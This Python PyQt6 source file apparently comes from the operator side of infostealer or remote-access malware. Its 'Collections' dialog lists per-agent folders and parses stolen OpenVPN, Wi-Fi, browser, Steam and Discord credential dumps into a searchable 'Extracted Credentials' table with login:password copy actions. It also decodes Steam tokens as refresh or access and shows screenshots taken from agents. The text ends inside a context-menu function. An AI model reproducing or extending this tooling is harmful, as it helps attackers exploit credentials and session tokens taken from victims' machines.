import os
import re
import json
import subprocess
import sys
from datetime import datetime
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *


PASSWORD_KEYWORDS = [
    'password', 'passwd', 'pass', 'pwd', 'login', 'username', 'user',
    'secret', 'token', 'apikey', 'api_key', 'privatekey',
    'creds', 'credentials'
]

class CollectionsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Collections")
        self.setMinimumSize(1000, 700)
        self.resize(1100, 750)
        self.setModal(False)
        self.setStyleSheet(self.get_stylesheet())
        self.current_path = self.get_collections_root()
        self.history = []
        self.credential_items = []
        self.screenshot_files = []
        self.current_agent_root = None  
        self.init_ui()
        self.load_tree()
        self.installEventFilter(self)

    def get_collections_root(self):
        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, "collections")

    def get_stylesheet(self):
        return """
        QDialog {
            background-color: #050505;
        }
        QTabWidget::pane {
            border: 1px solid #1a1a1a;
            background: #0a0a0a;
        }
        QTabBar::tab {
            background: #111111;
            color: #777777;
            padding: 8px 20px;
            border: 1px solid #1a1a1a;
            border-bottom: none;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 11px;
            letter-spacing: 2px;
            text-transform: uppercase;
            min-width: 100px;
        }
        QTabBar::tab:selected {
            background: #1a1010;
            color: #ffffff;
            border-bottom: 2px solid #8B0000;
        }
        QTabBar::tab:hover:!selected {
            background: #161616;
            color: #aaaaaa;
        }
        QTreeWidget, QListWidget, QTableWidget {
            background-color: #0a0a0a;
            border: none;
            font-family: 'Consolas', monospace;
            font-size: 11px;
            outline: none;
        }
        QTreeWidget::item, QListWidget::item, QTableWidget::item {
            padding: 4px;
            color: #a0a0a0;
            border: none;
        }
        QTreeWidget::item:selected, QListWidget::item:selected, QTableWidget::item:selected {
            background-color: #1a1010;
            color: #ffffff;
        }
        QTreeWidget::item:hover, QListWidget::item:hover, QTableWidget::item:hover {
            background-color: #141414;
        }
        QHeaderView::section {
            background-color: #0d0d0d;
            color: #8B0000;
            padding: 6px;
            border: 1px solid #1a1a1a;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 10px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        QPushButton {
            background-color: transparent;
            border: 1px solid #333333;
            color: #d0d0d0;
            padding: 6px 16px;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-weight: bold;
            font-size: 10px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }
        QPushButton:hover {
            background-color: #8B0000;
            color: #ffffff;
            border-color: #8B0000;
        }
        QLabel {
            color: #a0a0a0;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 11px;
        }
        QSplitter::handle {
            background-color: #1a1a1a;
        }
        QLineEdit {
            background-color: #0d0d0d;
            border: 1px solid #1a1a1a;
            color: #cccccc;
            padding: 4px;
            font-family: 'Consolas', monospace;
            font-size: 11px;
        }
        QLineEdit:focus {
            border: 1px solid #444444;
        }
        QScrollBar:vertical {
            border: none;
            background: #050505;
            width: 6px;
            margin: 0px;
        }
        QScrollBar::handle:vertical {
            background: #333333;
            min-height: 20px;
        }
        QScrollBar::handle:vertical:hover {
            background: #8B0000;
        }
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
            border: none;
            background: none;
        }
        QScrollBar:horizontal {
            border: none;
            background: #050505;
            height: 6px;
            margin: 0px;
        }
        QScrollBar::handle:horizontal {
            background: #333333;
            min-width: 20px;
        }
        QScrollBar::handle:horizontal:hover {
            background: #8B0000;
        }
        QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {
            border: none;
            background: none;
        }
        """

    def init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        header = QLabel("COLLECTIONS")
        header.setStyleSheet("font-size: 14px; letter-spacing: 8px; color: #8B0000;")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.setTabPosition(QTabWidget.TabPosition.North)

        self.files_tab = QWidget()
        files_layout = QVBoxLayout(self.files_tab)
        files_layout.setContentsMargins(0, 0, 0, 0)
        files_layout.setSpacing(5)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.setSizes([280, 600])

        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        left_layout.setContentsMargins(0, 0, 0, 0)
        left_layout.addWidget(QLabel("AGENTS"))
        self.tree = QTreeWidget()
        self.tree.setHeaderLabel("Agent Folders")
        self.tree.itemClicked.connect(self.on_tree_click)
        left_layout.addWidget(self.tree)
        splitter.addWidget(left_widget)

        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.addWidget(QLabel("FILES"))
        self.file_list = QListWidget()
        self.file_list.setIconSize(QSize(28, 28))
        self.file_list.itemDoubleClicked.connect(self.on_file_double_click)
        right_layout.addWidget(self.file_list)

        info_layout = QHBoxLayout()
        self.path_label = QLabel("")
        info_layout.addWidget(self.path_label)
        info_layout.addStretch()
        self.refresh_btn = QPushButton("REFRESH")
        self.refresh_btn.clicked.connect(self.refresh_current)
        info_layout.addWidget(self.refresh_btn)
        self.explorer_btn = QPushButton("OPEN IN EXPLORER")
        self.explorer_btn.clicked.connect(self.open_in_explorer)
        info_layout.addWidget(self.explorer_btn)
        right_layout.addLayout(info_layout)

        splitter.addWidget(right_widget)
        files_layout.addWidget(splitter)
        self.tabs.addTab(self.files_tab, "Files")

        self.creds_tab = QWidget()
        creds_layout = QVBoxLayout(self.creds_tab)
        creds_layout.setContentsMargins(0, 0, 0, 0)

        creds_header = QHBoxLayout()
        creds_header.addWidget(QLabel("EXTRACTED CREDENTIALS"))
        creds_header.addStretch()
        self.creds_search = QLineEdit()
        self.creds_search.setPlaceholderText("Search...")
        self.creds_search.textChanged.connect(self.filter_credentials)
        creds_header.addWidget(self.creds_search)
        creds_layout.addLayout(creds_header)

        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(4)
        self.creds_table.setHorizontalHeaderLabels(["Source", "Type", "Login/Username", "Password/Secret"])
        self.creds_table.horizontalHeader().setStretchLastSection(True)
        self.creds_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.creds_table.setAlternatingRowColors(False)
        self.creds_table.setSortingEnabled(True)

        self.creds_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.creds_table.customContextMenuRequested.connect(self.show_creds_context_menu)
        self.creds_table.itemDoubleClicked.connect(lambda item: self.copy_to_clipboard(item.text()))

        creds_layout.addWidget(self.creds_table)
        self.tabs.addTab(self.creds_tab, "Credentials")

        self.screenshots_tab = QWidget()
        ss_layout = QVBoxLayout(self.screenshots_tab)
        ss_layout.setContentsMargins(0, 0, 0, 0)

        ss_header = QHBoxLayout()
        ss_header.addWidget(QLabel("SCREENSHOTS"))
        ss_header.addStretch()
        self.ss_refresh_btn = QPushButton("REFRESH")
        self.ss_refresh_btn.clicked.connect(self.refresh_screenshots)
        ss_header.addWidget(self.ss_refresh_btn)
        self.ss_delete_btn = QPushButton("DELETE SELECTED")
        self.ss_delete_btn.clicked.connect(self.delete_selected_screenshots)
        self.ss_delete_btn.setStyleSheet("color: #8B0000; border: 1px solid #8B0000;")
        ss_header.addWidget(self.ss_delete_btn)
        ss_layout.addLayout(ss_header)

        self.ss_list = QListWidget()
        self.ss_list.setIconSize(QSize(120, 80))
        self.ss_list.setViewMode(QListWidget.ViewMode.IconMode)
        self.ss_list.setResizeMode(QListWidget.ResizeMode.Adjust)
        self.ss_list.setUniformItemSizes(True)
        self.ss_list.setGridSize(QSize(140, 110))
        self.ss_list.setSpacing(10)
        self.ss_list.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
        self.ss_list.itemDoubleClicked.connect(self.open_screenshot)
        self.ss_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.ss_list.customContextMenuRequested.connect(self.show_ss_context_menu)
        ss_layout.addWidget(self.ss_list)

        self.tabs.addTab(self.screenshots_tab, "Screenshots")

        layout.addWidget(self.tabs)

        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet("color: #555555; font-size: 9px; letter-spacing: 1px;")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.status_label)

        close_btn = QPushButton("CLOSE")
        close_btn.clicked.connect(self.accept)
        close_btn.setFixedWidth(120)
        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        btn_layout.addWidget(close_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)

        self.tabs.currentChanged.connect(self.on_tab_changed)

    def get_current_agent_root_folder(self):

        if self.current_agent_root and os.path.exists(self.current_agent_root):
            return self.current_agent_root

        current_item = self.tree.currentItem()
        if not current_item:
            root_item = self.tree.topLevelItem(0)
            if root_item and root_item.childCount() > 0:
                first_child = root_item.child(0)
                agent_root = first_child.data(0, Qt.ItemDataRole.UserRole)
                if agent_root:
                    self.current_agent_root = agent_root
                    return agent_root
            return None

        item = current_item
        while item.parent() and item.parent().parent():
            item = item.parent()

        agent_root = item.data(0, Qt.ItemDataRole.UserRole)

        if agent_root and os.path.exists(agent_root):

            try:
                for entry in os.scandir(agent_root):
                    if entry.is_dir() and entry.name in ["Downloads", "screenshots", "Credentials"]:
                        self.current_agent_root = agent_root
                        return agent_root
            except:
                pass

        root_collections = self.get_collections_root()
        if os.path.exists(root_collections):
            for entry in os.scandir(root_collections):
                if entry.is_dir():
                    try:
                        if os.path.exists(os.path.join(entry.path, "Credentials")):
                            self.current_agent_root = entry.path
                            return entry.path
                    except:
                        pass

        return None

    def show_creds_context_menu(self, position):
        menu = QMenu()
        menu.setStyleSheet("""
            QMenu {
                background-color: #1a1a1a;
                border: 1px solid #333333;
                color: #cccccc;
            }
            QMenu::item {
                padding: 6px 25px;
            }
            QMenu::item:selected {
                background-color: #8B0000;
                color: white;
            }
        """)
        current_item = self.creds_table.currentItem()
        if not current_item:
            menu.addAction("No selection").setEnabled(False)
            menu.exec(self.creds_table.viewport().mapToGlobal(position))
            return

        row = current_item.row()
        col = current_item.column()
        source = self.creds_table.item(row, 0).text() if self.creds_table.item(row, 0) else ""
        cred_type = self.creds_table.item(row, 1).text() if self.creds_table.item(row, 1) else ""
        login = self.creds_table.item(row, 2).text() if self.creds_table.item(row, 2) else ""
        password = self.creds_table.item(row, 3).text() if self.creds_table.item(row, 3) else ""

        copy_cell_action = menu.addAction(f"Copy Cell: {current_item.text()}")
        copy_cell_action.triggered.connect(lambda: self.copy_to_clipboard(current_item.text()))
        menu.addSeparator()
        copy_source_action = menu.addAction(f"Copy Source: {source}")
        copy_source_action.triggered.connect(lambda: self.copy_to_clipboard(source))
        copy_type_action = menu.addAction(f"Copy Type: {cred_type}")
        copy_type_action.triggered.connect(lambda: self.copy_to_clipboard(cred_type))
        copy_login_action = menu.addAction(f"Copy Login: {login}")
        copy_login_action.triggered.connect(lambda: self.copy_to_clipboard(login))
        copy_password_action = menu.addAction(f"Copy Password: {password[:30] + '...' if len(password) > 30 else password}")
        copy_password_action.triggered.connect(lambda: self.copy_to_clipboard(password))
        menu.addSeparator()
        copy_row_action = menu.addAction("Copy Full Row (Tab-separated)")
        copy_row_action.triggered.connect(lambda: self.copy_to_clipboard(f"{source}\t{cred_type}\t{login}\t{password}"))
        copy_pair_action = menu.addAction("Copy Login:Password pair")
        copy_pair_action.triggered.connect(lambda: self.copy_to_clipboard(f"{login}:{password}"))
        menu.exec(self.creds_table.viewport().mapToGlobal(position))

    def copy_to_clipboard(self, text):
        if not text:
            self.status_label.setText("Nothing to copy")
            self.status_label.setStyleSheet("color: #ff6666; font-size: 9px; letter-spacing: 1px;")
            QTimer.singleShot(2000, lambda: self.status_label.setStyleSheet("color: #555555; font-size: 9px; letter-spacing: 1px;"))
            return
        clipboard = QApplication.clipboard()
        clipboard.setText(text)
        self.status_label.setText(f"Copied: {text[:50] + '...' if len(text) > 50 else text}")
        self.status_label.setStyleSheet("color: #00aa00; font-size: 9px; letter-spacing: 1px;")
        QTimer.singleShot(3000, lambda: self.status_label.setStyleSheet("color: #555555; font-size: 9px; letter-spacing: 1px;"))


    def eventFilter(self, obj, event):
        if event.type() == QEvent.Type.MouseButtonPress:
            if event.button() == Qt.MouseButton.XButton1:
                self.go_back()
                return True
        return super().eventFilter(obj, event)

    def go_back(self):
        if self.history:
            path = self.history.pop()
            self.current_path = path
            self.load_files(path)
            self.update_tree_selection(path)
            self.status_label.setText(f"Back to: {path}")

    def update_tree_selection(self, path):
        def find_item(root_item, target_path):
            if root_item.data(0, Qt.ItemDataRole.UserRole) == target_path:
                return root_item
            for i in range(root_item.childCount()):
                child = root_item.child(i)
                result = find_item(child, target_path)
                if result:
                    return result
            return None

        root_item = self.tree.topLevelItem(0)
        if root_item:
            item = find_item(root_item, path)
            if item:
                self.tree.setCurrentItem(item)
                self.tree.scrollToItem(item)

    def load_tree(self):
        self.tree.clear()
        root = self.get_collections_root()
        if not os.path.exists(root):
            item = QTreeWidgetItem(["[Collections folder not found]"])
            self.tree.addTopLevelItem(item)
            return

        root_item = QTreeWidgetItem([os.path.basename(root)])
        root_item.setData(0, Qt.ItemDataRole.UserRole, root)
        root_item.setIcon(0, self.style().standardIcon(QStyle.StandardPixmap.SP_DirIcon))
        self.tree.addTopLevelItem(root_item)
        root_item.setExpanded(True)
        self.add_subfolders(root_item, root)

    def add_subfolders(self, parent_item, path):
        try:
            for entry in os.scandir(path):
                if entry.is_dir():
                    sub_item = QTreeWidgetItem([entry.name])
                    sub_item.setData(0, Qt.ItemDataRole.UserRole, entry.path)
                    sub_item.setIcon(0, self.style().standardIcon(QStyle.StandardPixmap.SP_DirIcon))
                    parent_item.addChild(sub_item)
                    sub_item.addChild(QTreeWidgetItem(["placeholder"]))
        except PermissionError:
            pass

    def on_tree_click(self, item, column):
        path = item.data(0, Qt.ItemDataRole.UserRole)
        if not path:
            return
        if item.childCount() == 1 and item.child(0).text(0) == "placeholder":
            item.takeChildren()
            self.add_subfolders(item, path)


        if item.parent() and item.parent().data(0, Qt.ItemDataRole.UserRole) == self.get_collections_root():
            self.current_agent_root = path

        if self.history and self.history[-1] != self.current_path:
            self.history.append(self.current_path)
        elif not self.history:
            self.history.append(self.current_path)
        self.current_path = path
        self.load_files(path)
        self.refresh_screenshots()

    def load_files(self, path):
        self.file_list.clear()
        if not os.path.exists(path):
            return
        try:
            entries = list(os.scandir(path))
            entries.sort(key=lambda e: (not e.is_dir(), e.name.lower()))
            for entry in entries:
                item = QListWidgetItem(entry.name)
                item.setData(Qt.ItemDataRole.UserRole, entry.path)
                if entry.is_dir():
                    item.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_DirIcon))
                else:
                    item.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileIcon))
                self.file_list.addItem(item)
            self.status_label.setText(f"Loaded {len(entries)} items from {path}")
            self.path_label.setText(f"Path: {path}")
        except Exception as e:
            self.status_label.setText(f"Error: {str(e)}")

    def on_file_double_click(self, item):
        path = item.data(Qt.ItemDataRole.UserRole)
        if not path:
            return
        if os.path.isdir(path):
            if self.history and self.history[-1] != self.current_path:
                self.history.append(self.current_path)
            elif not self.history:
                self.history.append(self.current_path)
            self.current_path = path
            self.load_files(path)
            self.update_tree_selection(path)
            self.refresh_screenshots()
        else:
            self.open_file(path)

    def open_file(self, path):
        ext = os.path.splitext(path)[1].lower()
        if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']:
            self.show_image(path)
        elif ext in ['.txt', '.log', '.cfg', '.ini', '.json', '.xml', '.py', '.js', '.html', '.css']:
            self.show_text(path)
        else:
            try:
                if sys.platform == 'win32':
                    os.startfile(path)
                else:
                    subprocess.Popen(['xdg-open', path])
            except Exception as e:
                QMessageBox.warning(self, "Cannot Open", f"Could not open file:\n{str(e)}")

    def show_image(self, path):
        dialog = QDialog(self)
        dialog.setWindowTitle(os.path.basename(path))
        dialog.setModal(True)
        layout = QVBoxLayout(dialog)
        label = QLabel()
        pixmap = QPixmap(path)
        if not pixmap.isNull():
            screen = QApplication.primaryScreen().availableGeometry()
            max_w = screen.width() * 0.8
            max_h = screen.height() * 0.8
            scaled = pixmap.scaled(int(max_w), int(max_h), Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
            label.setPixmap(scaled)
        else:
            label.setText("Cannot display image")
        layout.addWidget(label)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        dialog.exec()

    def show_text(self, path):
        dialog = QDialog(self)
        dialog.setWindowTitle(os.path.basename(path))
        dialog.setMinimumSize(600, 400)
        dialog.setModal(True)
        layout = QVBoxLayout(dialog)
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)
        text_edit.setFont(QFont("Consolas", 10))
        try:
            with open(path, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
            text_edit.setPlainText(content)
        except Exception as e:
            text_edit.setPlainText(f"Error reading file: {str(e)}")
        layout.addWidget(text_edit)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        dialog.exec()

    def refresh_current(self):
        if self.current_path:
            self.load_files(self.current_path)
            self.load_tree()
            

    def open_in_explorer(self):
        if self.current_path and os.path.exists(self.current_path):
            try:
                if sys.platform == 'win32':
                    os.startfile(self.current_path)
                else:
                    subprocess.Popen(['xdg-open', self.current_path])
            except Exception as e:
                QMessageBox.warning(self, "Cannot Open", f"Could not open folder:\n{str(e)}")


    def update_credentials_tab(self):

        self.credential_items = []

        current_item = self.tree.currentItem()
        if not current_item:
            self.creds_table.setRowCount(0)
            self.status_label.setText("Select an agent or collections root in Files tab.")
            return
        
        selected_path = current_item.data(0, Qt.ItemDataRole.UserRole)
        collections_root = self.get_collections_root()
        
        if not selected_path or not os.path.exists(selected_path):
            self.creds_table.setRowCount(0)
            self.status_label.setText("Selected path does not exist.")
            return
        

        if selected_path == collections_root:
            self.status_label.setText("Scanning all agents for credentials...")
            QApplication.processEvents()

            for agent_entry in os.scandir(collections_root):
                if agent_entry.is_dir():
                    creds_path = os.path.join(agent_entry.path, "Credentials")
                    if os.path.exists(creds_path):
                        self.scan_credentials_folder(creds_path, agent_entry.name)
            
            self.display_credentials()
            self.status_label.setText(f"All agents scanned: {len(self.credential_items)} credential entries found.")
            return

        agent_root = self.get_current_agent_root_folder()
        if not agent_root:
            self.creds_table.setRowCount(0)
            self.status_label.setText("No agent root found for current selection.")
            return
        
        creds_path = os.path.join(agent_root, "Credentials")
        if not os.path.exists(creds_path):
            self.creds_table.setRowCount(0)
            self.status_label.setText(f"No Credentials folder found for this agent.")
            return
        
        self.status_label.setText(f"Scanning agent: {os.path.basename(agent_root)}")
        QApplication.processEvents()
        
        self.scan_credentials_folder(creds_path, os.path.basename(agent_root))
        
        self.display_credentials()
        self.status_label.setText(f"Agent scanned: {len(self.credential_items)} credential entries found.")

    def scan_credentials_folder(self, creds_path, agent_name):

        if not os.path.exists(creds_path):
            return

        for root, dirs, files in os.walk(creds_path):

            if "browsers" in root.lower():
                continue
            for file in files:
                file_path = os.path.join(root, file)

                self.parse_file_for_creds(file_path, root, agent_name)

    def parse_file_for_creds(self, file_path, root, agent_source=None):
        filename = os.path.basename(file_path)
        if agent_source is None:
            agent_source = self.get_agent_folder_name(root)

        if filename == "OpenVPN_passwords.txt":
            self.parse_openvpn_file(file_path, agent_source)
            return
        elif filename == "WiFi_passwords.txt":
            self.parse_wifi_file(file_path, agent_source)
            return
        elif filename == "Browser_credentials.txt":
            self.parse_browser_file(file_path, agent_source)
            return
        elif filename.startswith("steam_tokens_"):
            self.parse_steam_file(file_path, agent_source)
            return
        elif filename.startswith("discord_tokens_"):
            self.parse_discord_file(file_path, agent_source)

        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
        except:
            return

        if file_path.endswith('.json'):
            try:
                data = json.loads(content)
                self.parse_json_creds(data, file_path, agent_source)
                return
            except:
                pass

        lines = content.splitlines()
        patterns = [
            r'(?:login|user(?:name)?)\s*[:=]\s*([^\s,]+)',
            r'(?:pass(?:word)?|pwd)\s*[:=]\s*([^\s,]+)',
            r'(?:credential|secret|token|apikey)\s*[:=]\s*([^\s,]+)',
        ]
        found = {}
        for line in lines:
            line = line.strip()
            if not line:
                continue
            lower = line.lower()
            if not any(kw in lower for kw in PASSWORD_KEYWORDS):
                continue
            for pattern in patterns:
                match = re.search(pattern, line, re.IGNORECASE)
                if match:
                    key = pattern.split('\\s*[:=]')[0].strip()
                    value = match.group(1)
                    found[key] = value
        if found:
            login = found.get('login') or found.get('username') or found.get('user') or ''
            password = found.get('password') or found.get('pass') or found.get('pwd') or found.get('secret') or found.get('token') or ''
            type_ = 'Generic'
            self.credential_items.append({
                'source': agent_source,
                'type': type_,
                'login': login,
                'password': password
            })

    def get_agent_folder_name(self, root_path):
        base = os.path.basename(root_path)
        parts = root_path.split(os.sep)
        try:
            idx = parts.index('collections')
            if idx + 1 < len(parts):
                agent_folder = parts[idx + 1]
            else:
                agent_folder = base
        except ValueError:
            agent_folder = base
        if '_' in agent_folder:
            return agent_folder.split('_', 1)[1]
        return agent_folder

    def parse_discord_file(self, file_path, agent_source):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
        except:
            return
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('AGENT:') or line.startswith('DATE:'):
                continue
            if re.match(r'^\d+\)\s+DISCORD\s+:\s+.+$', line):
                parts = line.split(':', 1)
                if len(parts) == 2:
                    token = parts[1].strip()
                    self.credential_items.append({
                        'source': agent_source,
                        'type': 'Discord',
                        'login': 'DISCORD',
                        'password': token
                    })

    def parse_steam_file(self, file_path, agent_source):

        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
        except:
            return

        def get_token_type(token):

            try:
                parts = token.split('.')
                if len(parts) != 3:
                    return 'Unknown'

                import base64
                payload = parts[1]

                padding = 4 - (len(payload) % 4)
                if padding != 4:
                    payload += '=' * padding
                
                decoded = base64.urlsafe_b64decode(payload)
                data = json.loads(decoded)
                
                aud = data.get('aud', [])
                if isinstance(aud, str):
                    aud = [aud]

                if 'renew' in aud:
                    return 'REFRESH Token'
                elif 'web' in aud or 'client' in aud:
                    return 'ACCESS Token'
                else:
                    return 'ACCESS Token'
                    
            except Exception as e:
                return 'Unknown Token'

        in_tokens_section = False
        token_counter = 0
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('Agent:') or line.startswith('Date:'):
                continue
            if line.startswith('Steam Tokens:'):
                in_tokens_section = True
                continue
            if in_tokens_section and (line.startswith('ey') or '.' in line):
                token_counter += 1
                token_type = get_token_type(line)
                self.credential_items.append({
                    'source': agent_source,
                    'type': 'Steam',
                    'login': f'{token_type} #{token_counter}',
                    'password': line
                })

    def parse_openvpn_file(self, file_path, agent_source):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
        except:
            return
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('Agent:') or line.startswith('Date:'):
                continue
            if re.match(r'^\d+\)\s+.+\s+:\s+.+$', line):
                parts = line.split(':', 1)
                if len(parts) == 2:
                    left = parts[0].strip()
                    password = parts[1].strip()
                    match = re.match(r'^\d+\)\s+(.+)$', left)
                    if match:
                        config = match.group(1).strip()
                        self.credential_items.append({
                            'source': agent_source,
                            'type': 'OpenVPN',
                            'login': config,
                            'password': password
                        })
            else:
                if '----' in line or '===' in line:
                    continue
                if '#    Config' in line or 'Config' in line and 'Username' in line and 'Password' in line:
                    continue
                parts = line.split()
                if len(parts) >= 4:
                    config = parts[1] if len(parts) > 1 else ''
                    password = parts[3] if len(parts) > 3 else ''
                    if config and password:
                        self.credential_items.append({
                            'source': agent_source,
                            'type': 'OpenVPN',
                            'login': config,
                            'password': password
                        })

    def parse_wifi_file(self, file_path, agent_source):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
        except:
            return
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('Agent:') or line.startswith('Date:'):
                continue
            if re.match(r'^\d+\)\s+.+\s+:\s+.+$', line):
                parts = line.split(':', 1)
                if len(parts) == 2:
                    left = parts[0].strip()
                    password = parts[1].strip()
                    match = re.match(r'^\d+\)\s+(.+)$', left)
                    if match:
                        ssid = match.group(1).strip()
                        self.credential_items.append({
                            'source': agent_source,
                            'type': 'Wi-Fi',
                            'login': ssid,
                            'password': password
                        })
            else:
                if '----' in line or '===' in line:
                    continue
                if '#    SSID' in line or 'SSID' in line and 'Password' in line:
                    continue
                parts = line.split()
                if len(parts) >= 3:
                    ssid = parts[1] if len(parts) > 1 else ''
                    password = parts[2] if len(parts) > 2 else ''
                    if ssid and password:
                        self.credential_items.append({
                            'source': agent_source,
                            'type': 'Wi-Fi',
                            'login': ssid,
                            'password': password
                        })

    def parse_browser_file(self, file_path, agent_source):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
        except:
            return
        data_start = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('Agent:') or line.startswith('Date:'):
                continue
            if line.startswith('----') or line.startswith('==='):
                data_start = True
                continue
            if data_start:
                parts = line.split()
                if len(parts) >= 6:
                    browser = parts[1] if len(parts) > 1 else ''
                    typ = parts[2] if len(parts) > 2 else ''
                    username = parts[4] if len(parts) > 4 else ''
                    password = parts[5] if len(parts) > 5 else ''
                    if typ.lower() == 'cookie':
                        continue
                    self.credential_items.append({
                        'source': agent_source,
                        'type': 'Browser',
                        'login': username,
                        'password': password
                    })

    def parse_json_creds(self, data, file_path, agent_source):
        def recurse(obj, path=''):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    new_path = f"{path}.{k}" if path else k
                    if isinstance(v, (dict, list)):
                        recurse(v, new_path)
                    elif isinstance(v, str):
                        lower_v = v.lower()
                        lower_k = k.lower()
                        if any(kw in lower_k or kw in lower_v for kw in PASSWORD_KEYWORDS):
                            login = ''
                            if isinstance(obj, dict):
                                for k2, v2 in obj.items():
                                    if 'user' in k2.lower() or 'login' in k2.lower():
                                        login = str(v2)
                                        break
                            self.credential_items.append({
                                'source': agent_source,
                                'type': 'JSON',
                                'login': login,
                                'password': v
                            })
            elif isinstance(obj, list):
                for item in obj:
                    recurse(item, path)
        recurse(data)

    def display_credentials(self):
        self.creds_table.setRowCount(0)
        for item in self.credential_items:
            row = self.creds_table.rowCount()
            self.creds_table.insertRow(row)
            self.creds_table.setItem(row, 0, QTableWidgetItem(item['source']))
            self.creds_table.setItem(row, 1, QTableWidgetItem(item['type']))
            self.creds_table.setItem(row, 2, QTableWidgetItem(item['login']))
            self.creds_table.setItem(row, 3, QTableWidgetItem(item['password']))
        self.creds_table.resizeColumnsToContents()
        self.creds_table.setColumnWidth(0, 250)
        self.creds_table.setColumnWidth(1, 100)

    def filter_credentials(self, text):
        text = text.lower()
        for row in range(self.creds_table.rowCount()):
            show = False
            for col in range(self.creds_table.columnCount()):
                item = self.creds_table.item(row, col)
                if item and text in item.text().lower():
                    show = True
                    break
            self.creds_table.setRowHidden(row, not show)

    def refresh_screenshots(self):
        self.ss_list.clear()
        self.screenshot_files = []
        root = self.get_collections_root()
        if not os.path.exists(root):
            self.status_label.setText("Collections folder not found.")
            return

        for entry in os.scandir(root):
            if entry.is_dir():
                screenshots_path = os.path.join(entry.path, "screenshots")
                if os.path.exists(screenshots_path) and os.path.isdir(screenshots_path):
                    for f in os.scandir(screenshots_path):
                        if f.is_file() and f.name.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                            self.screenshot_files.append({
                                'path': f.path,
                                'name': f.name
                            })

        if not self.screenshot_files:
            self.status_label.setText("No screenshots found.")
            return

        self.screenshot_files.sort(key=lambda x: os.path.getmtime(x['path']), reverse=True)

        for item_data in self.screenshot_files:
            path = item_data['path']
            name = item_data['name']
            item = QListWidgetItem(name)
            item.setData(Qt.ItemDataRole.UserRole, path)
            pixmap = QPixmap(path)
            if not pixmap.isNull():
                scaled = pixmap.scaled(120, 80, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
                item.setIcon(QIcon(scaled))
            else:
                item.setIcon(self.style().standardIcon(QStyle.StandardPixmap.SP_FileIcon))
            self.ss_list.addItem(item)

        self.status_label.setText(f"Loaded {len(self.screenshot_files)} screenshots from all agents")

    def delete_selected_screenshots(self):
        selected_items = self.ss_list.selectedItems()
        if not selected_items:
            QMessageBox.information(self, "No Selection", "Please select screenshots to delete.")
            return

        count = len(selected_items)
        reply = QMessageBox.question(
            self,
            "Confirm Delete",
            f"Delete {count} screenshot(s) permanently?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        deleted = 0
        for item in selected_items:
            path = item.data(Qt.ItemDataRole.UserRole)
            try:
                os.remove(path)
                deleted += 1
            except Exception as e:
                self.status_label.setText(f"Error deleting {os.path.basename(path)}: {str(e)}")

        self.status_label.setText(f"Deleted {deleted} screenshots.")
        self.refresh_screenshots()

    def open_screenshot(self, item):
        path = item.data(Qt.ItemDataRole.UserRole)
        if path:
            self.show_image(path)

    def show_ss_context_menu(self, position):
        if not self.ss_list.itemAt(position):
            return
        menu = QMenu()
        menu.addAction("Open", lambda: self.open_screenshot(self.ss_list.currentItem()))
